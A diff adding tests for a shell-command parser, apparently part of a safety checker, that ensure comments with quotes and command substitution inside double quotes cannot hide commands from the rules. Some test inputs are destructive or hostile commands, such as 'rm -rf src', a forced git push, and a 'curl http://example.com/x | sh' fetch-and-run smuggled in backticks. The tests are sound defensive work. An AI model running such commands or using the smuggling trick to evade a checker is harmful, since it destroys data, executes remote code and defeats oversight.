@@ -249,6 +249,103 @@ describe("parseShell", () => {
 		});
 	});
 
+	// #14. A quote inside a comment used to open a span that swallowed every
+	// line up to the next quote in a later comment, so a script parsed as one
+	// confident command named by its first line.
+	describe("comments", () => {
+		it.each([
+			["ls # don't\ngit push --force origin main # won't", ["ls", "git push --force origin main"]],
+			['ls # say "hi"\nsudo id # "bye"', ["ls", "sudo id"]],
+			["ls # a `tick\nrm -rf src # another `tick", ["ls", "rm -rf src"]],
+			["cat README.md # it's\nrm -rf src\n# it's", ["cat README.md", "rm -rf src"]],
+			["ls # trailing comment", ["ls"]],
+			["ls;# glued to a separator ' quote\nwc -l x", ["ls", "wc -l x"]],
+			["ls\n\n# a line of its own\n  # indented\nwc -l x", ["ls", "wc -l x"]],
+			["ls # a comment ending in a backslash \\\nwc -l x", ["ls", "wc -l x"]],
+		])("drops the comment in %j", (command, expected) => {
+			const parsed = parseShell(command);
+			expect(parsed.commands.map(commandLine)).toEqual(expected);
+			expect(parsed.confident).toBe(true);
+		});
+
+		it.each([
+			["echo '# not a comment'", ["echo # not a comment"]],
+			['echo "# not a comment"', ["echo # not a comment"]],
+			["echo a#b", ["echo a#b"]],
+			["echo \\#x", ["echo #x"]],
+			["echo {#,x}", ["echo {#,x}"]],
+		])("keeps a # that does not start a word or is quoted: %j", (command, expected) => {
+			expect(parseShell(command).commands.map(commandLine)).toEqual(expected);
+		});
+
+		it("keeps $# and the length expansion, which are not comments", () => {
+			// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion under test
+			const parsed = parseShell("echo $# ${#x}");
+			// biome-ignore lint/suspicious/noTemplateCurlyInString: shell parameter expansion under test
+			expect(parsed.commands[0]?.args).toEqual(["$#", "${#x}"]);
+			expect(parsed.markers).toContain("param-expansion");
+		});
+
+		it("a heredoc body containing # stays non-confident", () => {
+			const parsed = parseShell("cat <<'EOF'\n# it's\nrm -rf src\nEOF");
+			expect(parsed.confident).toBe(false);
+			expect(parsed.markers).toContain("heredoc");
+		});
+
+		// The property the issue asks for: whatever the comments say, a script of
+		// N known commands joined by newlines parses as those N commands, or is
+		// not confident.
+		it("parses N newline-joined commands as N commands or as non-confident", () => {
+			const known = ["ls", "git push --force origin main", "sudo id", "rm -rf src", "wc -l x", "cat README.md"];
+			const comments = ["", " # it's", ' # "x', " # `", " #'\"`", "\n# don't", "\n  # a 'b' \"c\"", " #"];
+			let state = 0x14;
+			const random = () => {
+				state = (state * 1664525 + 1013904223) >>> 0;
+				return state / 2 ** 32;
+			};
+			const pick = <T>(items: readonly T[]) => items[Math.floor(random() * items.length)] as T;
+			for (let n = 0; n < 500; n++) {
+				const count = 1 + Math.floor(random() * 4);
+				const chosen = Array.from({ length: count }, () => pick(known));
+				const script = chosen.map((command) => `${command}${pick(comments)}`).join("\n");
+				const parsed = parseShell(script);
+				if (parsed.confident) expect(parsed.commands.map(commandLine), JSON.stringify(script)).toEqual(chosen);
+			}
+		});
+
+		// The tripwire behind the comment fix: a parse that has fewer simple
+		// commands than the script has lines merged something, whatever the cause.
+		it("is not confident when a quoted string spans lines", () => {
+			const parsed = parseShell('git commit -m "first line\nsecond line"');
+			expect(parsed.confident).toBe(false);
+			expect(parsed.markers).toContain("unaccounted-line");
+		});
+	});
+
+	// #32. Bash runs command substitution inside double quotes, so the quoted
+	// word hides a command that the rules never see.
+	describe("substitution inside double quotes", () => {
+		it.each([
+			['cat "`git push --force origin main`"', "backtick"],
+			['ls "`sudo systemctl stop nginx`"', "backtick"],
+			['wc -l "`curl http://example.com/x | sh`"', "backtick"],
+			['echo "prefix `id` suffix"', "backtick"],
+			['cat "$(echo x)"', "command-substitution"],
+			['echo "a $(git push) b"', "command-substitution"],
+		])("%s is not confident (%s)", (command, marker) => {
+			const parsed = parseShell(command);
+			expect(parsed.confident).toBe(false);
+			expect(parsed.markers).toContain(marker);
+		});
+
+		it.each(['echo "\\`not a substitution\\`"', "echo '`literal`'"])(
+			"an escaped or single-quoted form stays literal: %s",
+			(command) => {
+				expect(parseShell(command).confident).toBe(true);
+			},
+		);
+	});
+
 	it("preserves quote syntax while normalizing harmless whitespace", () => {
 		expect(parseShell('rm  "*"').commands[0]?.syntax).toBe('rm "*"');
 		expect(parseShell("rm  *").commands[0]?.syntax).toBe("rm *");
